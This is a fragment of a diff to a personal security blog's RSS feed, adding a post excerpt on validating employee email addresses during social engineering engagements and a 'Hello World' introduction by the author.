+&lt;p&gt;During SE engagements, we often either run across email addresses (by, say, simply scraping the main website) or want to enumerate the email address structure in use by an organization (generating possible alternatives using tools like jigsaw.rb). It would be helpful if it were possible to automate the process of validating those email addresses by associating them to additional information or social networking profiles. This is where Rapportive comes in handy.&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Hello World!</title>
+      <link>https://jordan-wright.com/blog/2013/10/11/hello-world/</link>
+      <pubDate>Fri, 11 Oct 2013 00:00:00 +0000</pubDate>
+      
+      <guid>https://jordan-wright.com/blog/2013/10/11/hello-world/</guid>
+      <description>#!/usr/bin/env python print &#39;Hello, World!&#39;  Hi there! My name is Jordan, and I am a security researcher, developer, and hobbyist.
+For the past few years, I created and maintained a blog for an organization I started called Raidersec. While I fully intend to leave the existing content on the Raidersec blog, I thought it would be ideal to create a personal blog on which I can continue writing about my research and projects dealing with not just security, but programming in general.</description>
     </item>
     
   </channel>
